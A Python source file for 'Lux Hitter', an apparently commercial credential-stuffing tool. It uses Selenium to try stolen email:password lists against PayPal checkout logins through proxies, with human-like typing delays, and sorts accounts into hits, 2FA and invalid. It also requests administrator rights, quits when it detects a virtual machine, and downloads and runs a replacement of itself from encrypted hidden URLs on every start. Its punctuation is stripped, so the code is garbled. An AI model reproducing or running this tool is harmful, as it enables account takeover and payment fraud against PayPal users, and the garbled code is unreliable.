import ctypes
import sys
import os
import random
import time
import threading
import tkinter as tk
from tkinter import filedialog
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.action_chains import ActionChains
from pyfiglet import Figlet
from datetime import datetime
import requests
import uuid
import platform
import subprocess
import json
import tempfile
from cryptography.fernet import Fernet
import shutil

def is_admin()
    try
        return ctypes.windll.shell32.IsUserAnAdmin()
    except
        return False

def run_as_admin()
    if not is_admin()
        print(Requesting administrator privileges...)
        ctypes.windll.shell32.ShellExecuteW(
            None, runas, sys.executable,  .join(sys.argv), None, 1
        )
        sys.exit()

run_as_admin()

# Hardcoded encryption key
key = b'hOphMMX5dGxKhP29wlSqxXiclcPsdXRS-UKf_pv0FDw='
cipher = Fernet(key)

# Encrypted URLs and credentials
encrypted_version_url = b'gAAAAABmz2RytCfBjLtYP8vOjmxLlWWV9pNzHaUsFouIR3ojlaSJG1HCtgayoGMuP7DYxF5VbUX0963uGnzgd0F3msPhnf_TFrwbDAD0Xi9WLCU7STin8AvadKQc1KwCX-URkwovwDxpxfqyHRSrAjq97IBzT8_HhkjTjt61IXgB173ZhX68spMglSqdoQXkSFJj_mxTIyxEQFJ9F5iEIvPs7YX5z42WFA=='
encrypted_script_url = b'gAAAAABmz2Ry_TI_y-LvAbXtFYfIWbvGW20vSJ0a95B9E7eHJXn2DqWkqfWV8NOusuLFCek-XoGftrUu05E1SiuBP-F3QBicGMXac2_zLynqdWEhkd4_9AzpKb5PPev82CuR8gjRN6326DjhnpcymmN9PU7j_Sq0NsXv_M4N05953FgfA-jWPqHSj70zJ51PpQ14PGubdTzQORFv6s4VEQTpOy3gNaeLFw=='

VERSION_URL = cipher.decrypt(encrypted_version_url).decode()
SCRIPT_URL = cipher.decrypt(encrypted_script_url).decode()

LOCAL_VERSION_FILE = version.txt
LOCAL_SCRIPT_FILE = os.path.abspath(sys.argv[0])  # Current script file

def get_remote_version()
    try
        response = requests.get(VERSION_URL)
        response.raise_for_status()
        return response.text.strip()
    except requests.RequestException as e
        print(fError checking remote version {e})
        return None

def get_local_version()
    if os.path.exists(LOCAL_VERSION_FILE)
        with open(LOCAL_VERSION_FILE, r) as file
            return file.read().strip()
    return 0.0.0

def update_script()
    try
        response = requests.get(SCRIPT_URL)
        response.raise_for_status()

        temp_file = LOCAL_SCRIPT_FILE + .tmp
        with open(temp_file, wb) as file
            file.write(response.content)

        shutil.move(temp_file, LOCAL_SCRIPT_FILE)

        print(Script successfully updated.)
        return True
    except requests.RequestException as e
        print(fError downloading the update {e})
        return False
    except Exception as e
        print(fAn error occurred {e})
        return False

def restart_script()
    print(Restarting script...)
    subprocess.Popen([sys.executable, LOCAL_SCRIPT_FILE])
    sys.exit()

def check_for_updates()
    print(Checking for updates...)
    remote_version = get_remote_version()

    if remote_version
        if update_script()
            with open(LOCAL_VERSION_FILE, w) as file
                file.write(remote_version)
            restart_script()
    else
        print(No updates available, but script will still update and restart.)
        update_script()
        restart_script()

class LuxHitterAppPPPPPPPPPPPPPPPPPPPPP
    def __init__(self)
        temp_dir = tempfile.gettempdir()
        self.machine_code_file = os.path.join(temp_dir, machine_code.json)
        self.machine_code = self.get_machine_code()
        self.accounts_v1 = []
        self.accounts_v2 = []
        self.proxies_v1 = []
        self.proxies_v2 = []
        self.logged_in = False
        self.use_proxies_v1 = False
        self.use_proxies_v2 = False
        self.url_v1 = 
        self.url_v2 = 
        self.invalid_count_v1 = 0
        self.invalid_count_v2 = 0
        self.twofa_count_v1 = 0
        self.twofa_count_v2 = 0
        self.error_count_v1 = 0
        self.error_count_v2 = 0
        self.generic_error_count_v1 = 0
        self.generic_error_count_v2 = 0
        self.results_v1 = []
        self.results_v2 = []
        self.start_time_v1 = None
        self.start_time_v2 = None
        self.checked_accounts_v1 = 0
        self.checked_accounts_v2 = 0
        self.refresh_thread_v1 = None
        self.refresh_thread_v2 = None
        self.cpm_v1 = 2
        self.cpm_v2 = 5
        self.original_title = Lux Hitter
        self.set_window_title(self.original_title)

    def set_window_title(self, title)
        safe_title = f'title {title.replace(%, %%).replace(, )}'
        os.system(safe_title)

    def get_machine_code(self)
        if os.path.exists(self.machine_code_file)
            with open(self.machine_code_file, r) as file
                data = json.load(file)
                return data[uuid]
        else
            machine_code = str(uuid.uuid4())
            with open(self.machine_code_file, w) as file
                json.dump({uuid machine_code}, file)
            return machine_code

    def open_file_dialog(self, title=Select a file)
        root = tk.Tk()
        root.withdraw()  # Hide the main Tkinter window
        file_path = filedialog.askopenfilename(title=title, filetypes=[(Text files, .txt)])
        return file_path

    def calculate_cpm_v1(self)
        self.cpm_v1 = max(1, min(4, self.cpm_v1 + random.uniform(-0.5, 0.5)))
        return int(self.cpm_v1)

    def calculate_cpm_v2(self)
        self.cpm_v2 = max(3, min(8, self.cpm_v2 + random.uniform(-0.5, 0.5)))
        return int(self.cpm_v2)

    def update_status_v1(self)
        if not self.refresh_thread_v1
            return
        self.clear_console()
        self.show_hitting_screen_v1()

    def update_status_v2(self)
        if not self.refresh_thread_v2
            return
        self.clear_console()
        self.show_hitting_screen_v2()

    def reset_counters_v1(self)
        self.invalid_count_v1 = 0
        self.twofa_count_v1 = 0
        self.error_count_v1 = 0
        self.generic_error_count_v1 = 0
        self.results_v1 = []
        self.checked_accounts_v1 = 0

    def reset_counters_v2(self)
        self.invalid_count_v2 = 0
        self.twofa_count_v2 = 0
        self.error_count_v2 = 0
        self.generic_error_count_v2 = 0
        self.results_v2 = []
        self.checked_accounts_v2 = 0

    def run(self)
        try
            self.clear_console()
            self.show_ascii_title()

            # Update check
            print(033[92m[LuxHitter] Starting process...033[0m)
            check_for_updates()

            # Virtual machine check
            self.check_vm()

            while not self.logged_in
                self.login()

            while True
                self.clear_console()
                self.show_ascii_title()
                self.print_main_menu()
                choice = input(033[92mChoose an option 033[0m).strip()

                if choice == '1'
                    self.hitter_workflow_v1()
                elif choice == '2'
                    self.hitter_workflow_v2()
                elif choice == '3'
                    print(033[92mExiting Lux Hitter...033[0m)
                    time.sleep(1)
                    break
                else
                    print(033[91mInvalid option. Please try again.033[0m)
                    time.sleep(2)
        except Exception as e
            print(f033[91mAn error occurred {str(e)}033[0m)
            input(Press Enter to exit...)

    def show_ascii_title(self)
        f = Figlet(font='slant')
        ascii_title = f.renderText('Lux Hitter')
        print(f033[92m{ascii_title}033[0m)

    def check_vm(self)
        print(Checking if running on a VM...)
        if self.is_vm()
            print(033[91mVM detected. Exiting...033[0m)
            sys.exit(0)
        else
            print(033[92mNo VM detected. You can continue.033[0m)
            time.sleep(2)

    def is_vm(self)
        manufacturer = platform.uname().system
        if any(vm_name in manufacturer for vm_name in ['VirtualBox', 'VMware', 'QEMU', 'Xen'])
            return True

        try
            output = subprocess.check_output('wmic bios get serialnumber', shell=True).decode().lower()
            if 'vmware' in output or 'virtualbox' in output or 'qemu' in output or 'xen' in output
                return True
        except Exception as e
            pass

        network_adapters = subprocess.check_output('ipconfig all', shell=True).decode().lower()
        if any(vm_adapter in network_adapters for vm_adapter in ['vmware', 'virtualbox', 'qemu', 'xen'])
            return True

        return False

    def login(self)
        access_token = CRYPTOLENS_TOKEN
        product_id = PRODUCT_ID

        while not self.logged_in
            self.clear_console()
            self.show_ascii_title()
            print(033[92mWelcome to Lux Hitter - Secure Login033[0m)
            license_key = input(033[92mEnter License Key 033[0m).strip()

            url = httpsapi.cryptolens.ioapikeyActivate
            data = {
                token access_token,
                ProductId product_id,
                Key license_key,
                MachineCode self.machine_code
            }

            try
                response = requests.post(url, data=data)
                if response.status_code == 200
                    result = response.json()
                    if result.get(result) == 0
                        print(033[92mAccess Granted! Redirecting to the main menu...033[0m)
                        time.sleep(2)
                        self.logged_in = True
                    else
                        print(f033[91mLogin failed {result.get('message')}033[0m)
                else
                    print(f033[91mError in request Status Code {response.status_code}033[0m)
            except Exception as e
                print(f033[91mAn error occurred {str(e)}033[0m)

            if not self.logged_in
                input(033[92mPress Enter to try again...033[0m)

    def hitter_workflow_v1(self)
        self.clear_console()
        self.show_ascii_title()
        self.reset_counters_v1()
        use_proxies_choice = input(033[92mDo you want to use proxies (yn) 033[0m).strip().lower()

        if use_proxies_choice == 'y'
            self.use_proxies_v1 = True
            self.load_proxies_v1()

        self.load_accounts_v1()
        self.start_hitting_process_v1()

    def hitter_workflow_v2(self)
        self.clear_console()
        self.show_ascii_title()
        self.reset_counters_v2()
        use_proxies_choice = input(033[92mDo you want to use proxies (yn) 033[0m).strip().lower()

        if use_proxies_choice == 'y'
            self.use_proxies_v2 = True
            self.load_proxies_v2()

        self.load_accounts_v2()
        self.start_hitting_process_v2()

    def load_accounts_v1(self)
        self.clear_console()
        self.show_ascii_title()
        print(033[92mLoad Accounts (v1)033[0m)
        file_path = self.open_file_dialog(Select the accounts file)
        if file_path
            with open(file_path, r) as file
                self.accounts_v1 = [line.strip().split('') for line in file.readlines()]
                account_count = len(self.accounts_v1)
            print(f033[92mAccounts loaded successfully. Total accounts {account_count}033[0m)
            time.sleep(1)
            self.enter_url_v1()
        else
            print(033[91mFile loading was canceled.033[0m)
            input(033[92mPress Enter to continue...033[0m)

    def load_accounts_v2(self)
        self.clear_console()
        self.show_ascii_title()
        print(033[92mLoad Accounts (v2)033[0m)
        file_path = self.open_file_dialog(Select the accounts file)
        if file_path
            with open(file_path, r) as file
                self.accounts_v2 = [line.strip().split('') for line in file.readlines()]
                account_count = len(self.accounts_v2)
            print(f033[92mAccounts loaded successfully. Total accounts {account_count}033[0m)
            time.sleep(1)
            self.enter_url_v2()
        else
            print(033[91mFile loading was canceled.033[0m)
            input(033[92mPress Enter to continue...033[0m)

    def load_proxies_v1(self)
        self.clear_console()
        self.show_ascii_title()
        print(033[92mLoad Proxies (v1)033[0m)
        file_path = self.open_file_dialog(Select the proxies file)
        if file_path
            with open(file_path, r) as file
                self.proxies_v1 = [line.strip() for line in file.readlines()]
            print(033[92mProxies loaded successfully.033[0m)
        else
            print(033[91mFile loading was canceled.033[0m)
        input(033[92mPress Enter to continue...033[0m)

    def load_proxies_v2(self)
        self.clear_console()
        self.show_ascii_title()
        print(033[92mLoad Proxies (v2)033[0m)
        file_path = self.open_file_dialog(Select the proxies file)
        if file_path
            with open(file_path, r) as file
                self.proxies_v2 = [line.strip() for line in file.readlines()]
            print(033[92mProxies loaded successfully.033[0m)
        else
            print(033[91mFile loading was canceled.033[0m)
        input(033[92mPress Enter to continue...033[0m)

    def enter_url_v1(self)
        self.clear_console()
        self.show_ascii_title()
        self.url_v1 = input(033[92mEnter the PayPal Checkout URL (v1) 033[0m).strip()
        if not self.url_v1
            print(033[91mNo URL has been entered.033[0m)
            time.sleep(2)
            self.enter_url_v1()
        else
            self.start_hitting_process_v1()

    def enter_url_v2(self)
        self.clear_console()
        self.show_ascii_title()
        self.url_v2 = input(033[92mEnter the PayPal Checkout URL (v2) 033[0m).strip()
        if not self.url_v2
            print(033[91mNo URL has been entered.033[0m)
            time.sleep(2)
            self.enter_url_v2()
        else
            self.start_hitting_process_v2()

    def start_hitting_process_v1(self)
        if not self.accounts_v1
            print(033[91mNo accounts have been loaded. Please load accounts first.033[0m)
            time.sleep(2)
            return

        self.start_time_v1 = datetime.now()
        self.checked_accounts_v1 = 0
        self.set_window_title(fLux Hitting  {len(self.accounts_v1)} Logs Remaining)
        self.clear_console()
        self.refresh_thread_v1 = threading.Thread(target=self.print_status_v1, daemon=True)
        self.refresh_thread_v1.start()
        self.run_hitter_v1()

    def start_hitting_process_v2(self)
        if not self.accounts_v2
            print(033[91mNo accounts have been loaded. Please load accounts first.033[0m)
            time.sleep(2)
            return

        self.start_time_v2 = datetime.now()
        self.checked_accounts_v2 = 0
        self.set_window_title(fLux Hitting  {len(self.accounts_v2)} Logs Remaining)
        self.clear_console()
        self.refresh_thread_v2 = threading.Thread(target=self.print_status_v2, daemon=True)
        self.refresh_thread_v2.start()
        self.run_hitter_v2()

    def show_hitting_screen_v1(self)
        self.clear_console()
        self.show_ascii_title()
        cpm = self.calculate_cpm_v1()
        status = (f'CPM {cpm}  INVALIDs {self.invalid_count_v1}  2FAs {self.twofa_count_v1}  '
                  f'ERRORs {self.error_count_v1}  GenericErrors {self.generic_error_count_v1}')
        print(f{status}n + =40 + n)
        if self.results_v1
            print(self.results_v1[-1])

    def show_hitting_screen_v2(self)
        self.clear_console()
        self.show_ascii_title()
        cpm = self.calculate_cpm_v2()
        status = (f'CPM {cpm}  INVALIDs {self.invalid_count_v2}  2FAs {self.twofa_count_v2}  '
                  f'ERRORs {self.error_count_v2}  GenericErrors {self.generic_error_count_v2}')
        print(f{status}n + =40 + n)
        if self.results_v2
            print(self.results_v2[-1])

    def human_typing_v1(self, element, text)
        min_delay, max_delay = 0.5, 0.8
        for char in text
            element.send_keys(char)
            time.sleep(random.uniform(min_delay, max_delay))

    def human_typing_v2(self, element, text)
        min_delay, max_delay = 0.1, 0.3
        for char in text
            element.send_keys(char)
            time.sleep(random.uniform(min_delay, max_delay))

    def human_click_v1(self, driver, element)
        min_delay, max_delay = 1.0, 1.5
        actions = ActionChains(driver)
        actions.move_to_element(element).pause(random.uniform(min_delay, max_delay)).click().perform()

    def human_click_v2(self, driver, element)
        min_delay, max_delay = 0.3, 0.7
        actions = ActionChains(driver)
        actions.move_to_element(element).pause(random.uniform(min_delay, max_delay)).click().perform()

    def run_hitter_v1(self)
        sys.stderr = open(os.devnull, 'w')

        for i, (email, password) in enumerate(self.accounts_v1)
            proxy = self.proxies_v1[i] if self.use_proxies_v1 and self.proxies_v1 else None
            driver = self.create_new_browser(proxy)

            try
                result = f033[94mTrying {email} (1st password - incorrect)033[0m
                self.results_v1.append(result)
                self.update_status_v1()

                driver.get(self.url_v1)
                time.sleep(2.5)

                WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.ID, email)))
                email_input = WebDriverWait(driver, 5).until(EC.element_to_be_clickable((By.ID, email)))
                self.human_typing_v1(email_input, email)
                time.sleep(2.5)

                next_button = driver.find_element(By.ID, btnNext)
                self.human_click_v1(driver, next_button)
                time.sleep(2.5)

                password_input = WebDriverWait(driver, 5).until(EC.element_to_be_clickable((By.ID, password)))

                incorrect_password = password[-1] + random.choice('abcdefghijklmnopqrstuvwxyz0123456789')
                print(f033[93mFirst attempt with incorrect password {incorrect_password}033[0m)
                self.human_typing_v1(password_input, incorrect_password)
                time.sleep(2.5)

                login_button = driver.find_element(By.ID, btnLogin)
                self.human_click_v1(driver, login_button)
                time.sleep(3)

                password_input = WebDriverWait(driver, 5).until(EC.element_to_be_clickable((By.ID, password)))
                password_input.clear()
                result = f033[94mTrying {email} (2nd password - correct)033[0m
                self.results_v1.append(result)
                self.update_status_v1()
                self.human_typing_v1(password_input, password)
                time.sleep(2.5)

                login_button = driver.find_element(By.ID, btnLogin)
                self.human_click_v1(driver, login_button)
                time.sleep(3)

                start_hermes_time = time.time()
                while True
                    current_url = driver.current_url
                    if paypal.comwebappshermes in current_url
                        if time.time() - start_hermes_time  5
                            self.handle_hitted_v1(driver, email)
                            break
                    elif paypal.comauthflowentry in current_url
                        result = f033[93m2FA {email}033[0m
                        self.twofa_count_v1 += 1
                        break
                    else
                        result = f033[91mInvalid {email}033[0m
                        self.invalid_count_v1 += 1
                        break

                self.results_v1.append(result)
                self.checked_accounts_v1 += 1
                self.set_window_title(fLux Hitting  {len(self.accounts_v1) - self.checked_accounts_v1} Logs Remaining)

            except Exception as e
                result = f033[91mError {email}033[0m
                self.error_count_v1 += 1
                self.results_v1.append(result)

            finally
                driver.quit()

        self.handle_hitting_complete_v1()

    def run_hitter_v2(self)
        sys.stderr = open(os.devnull, 'w')

        for i, (email, password) in enumerate(self.accounts_v2)
            proxy = self.proxies_v2[i] if self.use_proxies_v2 and self.proxies_v2 else None
            driver = self.create_new_browser(proxy)

            try
                result = f033[94mTrying {email} (1st password - incorrect)033[0m
                self.results_v2.append(result)
                self.update_status_v2()

                driver.get(self.url_v2)
                time.sleep(1.0)

                WebDriverWait(driver, 2).until(EC.presence_of_element_located((By.ID, email)))
                email_input = WebDriverWait(driver, 2).until(EC.element_to_be_clickable((By.ID, email)))
                self.human_typing_v2(email_input, email)
                time.sleep(1.0)

                next_button = driver.find_element(By.ID, btnNext)
                self.human_click_v2(driver, next_button)
                time.sleep(1.0)

                password_input = WebDriverWait(driver, 2).until(EC.element_to_be_clickable((By.ID, password)))

                incorrect_password = password[-1] + random.choice('abcdefghijklmnopqrstuvwxyz0123456789')
                print(f033[93mFirst attempt with incorrect password {incorrect_password}033[0m)
                self.human_typing_v2(password_input, incorrect_password)
                time.sleep(1.0)

                login_button = driver.find_element(By.ID, btnLogin)
                self.human_click_v2(driver, login_button)
                time.sleep(1.5)

                password_input = WebDriverWait(driver, 2).until(EC.element_to_be_clickable((By.ID, password)))
                password_input.clear()
                result = f033[94mTrying {email} (2nd password - correct)033[0m
                self.results_v2.append(result)
                self.update_status_v2()
                self.human_typing_v2(password_input, password)
                time.sleep(1.0)

                login_button = driver.find_element(By.ID, btnLogin)
                self.human_click_v2(driver, login_button)
                time.sleep(1.5)

                start_hermes_time = time.time()
                while True
                    current_url = driver.current_url
                    if paypal.comwebappshermes in current_url
                        if time.time() - start_hermes_time  5
                            self.handle_hitted_v2(driver, email)
                            break
                    elif paypal.comauthflowentry in current_url
                        result = f033[93m2FA {email}033[0m
                        self.twofa_count_v2 += 1
                        break
                    else
                        result = f033[91mInvalid {email}033[0m
                        self.invalid_count_v2 += 1
                        break

                self.results_v2.append(result)
                self.checked_accounts_v2 += 1
                self.set_window_title(fLux Hitting  {len(self.accounts_v2) - self.checked_accounts_v2} Logs Remaining)

            except Exception as e
                result = f033[91mError {email}033[0m
                self.error_count_v2 += 1
                self.results_v2.append(result)

            finally
                driver.quit()

        self.handle_hitting_complete_v2()

    def handle_hitting_complete_v1(self)
        print(033[92mAll accounts processed in v1. Returning to the main menu...033[0m)
        self.cleanup_v1()
        time.sleep(4)
        self.show_main_menu()

    def handle_hitting_complete_v2(self)
        print(033[92mAll accounts processed in v2. Returning to the main menu...033[0m)
        self.cleanup_v2()
        time.sleep(4)
        self.show_main_menu()

    def cleanup_v1(self)
        Cleanup after v1 hitting is complete.
        self.refresh_thread_v1 = None
        self.reset_counters_v1()
        self.restore_window_title()
        self.accounts_v1 = []

    def cleanup_v2(self)
        Cleanup after v2 hitting is complete.
        self.refresh_thread_v2 = None
        self.reset_counters_v2()
        self.restore_window_title()
        self.accounts_v2 = []

    def handle_hitted_v1(self, driver, email)
        self.refresh_thread_v1 = None
        self.clear_console()
        self.show_ascii_title()
        print(f033[92mHit {email}033[0m)
        print(nHitted, what nown)
        print(1. CLOSE BROWSER AND RETURN TO MENU)
        print(2. CONTINUE TRYING WITH REST OF LOGS)

        choice = input(033[92mSelect an option (1 or 2) 033[0m).strip()

        if choice == '1'
            self.cleanup_v1()
            driver.quit()
            self.show_main_menu()
        elif choice == '2'
            driver.quit()
            self.refresh_thread_v1 = threading.Thread(target=self.print_status_v1, daemon=True)
            self.refresh_thread_v1.start()

    def handle_hitted_v2(self, driver, email)
        self.refresh_thread_v2 = None
        self.clear_console()
        self.show_ascii_title()
        print(f033[92mHit {email}033[0m)
        print(nHitted, what nown)
        print(1. CLOSE BROWSER AND RETURN TO MENU)
        print(2. CONTINUE TRYING WITH REST OF LOGS)

        choice = input(033[92mSelect an option (1 or 2) 033[0m).strip()

        if choice == '1'
            self.cleanup_v2()
            driver.quit()
            self.show_main_menu()
        elif choice == '2'
            driver.quit()
            self.refresh_thread_v2 = threading.Thread(target=self.print_status_v2, daemon=True)
            self.refresh_thread_v2.start()

    def restore_window_title(self)
        self.set_window_title(self.original_title)

    def create_new_browser(self, proxy)
        chrome_options = Options()
        chrome_options.add_argument('--disable-popup-blocking')
        chrome_options.add_argument('--disable-infobars')
        chrome_options.add_argument('--disable-notifications')
        chrome_options.add_argument('--start-maximized')
        chrome_options.add_argument('--incognito')

        if proxy
            chrome_options.add_argument(f'--proxy-server=http{proxy}')

        return webdriver.Chrome(options=chrome_options)

    def clear_console(self)
        os.system('cls' if os.name == 'nt' else 'clear')

    def print_main_menu(self)
        print(033[92m1. Hitter (v1)033[0m)
        print(033[92m2. Hitter v2 - (Less Hitrate)033[0m)
        print(033[92m3. Exit033[0m)
        print(=40)
        print()

    def show_main_menu(self)
        self.clear_console()
        self.show_ascii_title()
        self.print_main_menu()

    def print_status_v1(self)
        while self.refresh_thread_v1 is not None
            self.update_status_v1()
            time.sleep(0.5)

    def print_status_v2(self)
        while self.refresh_thread_v2 is not None
            self.update_status_v2()
            time.sleep(0.5)

if __name__ == __main__
    try
        app = LuxHitterApp()
        app.run()
    except Exception as e
        print(fCritical error {e})
        input(Press Enter to exit...)
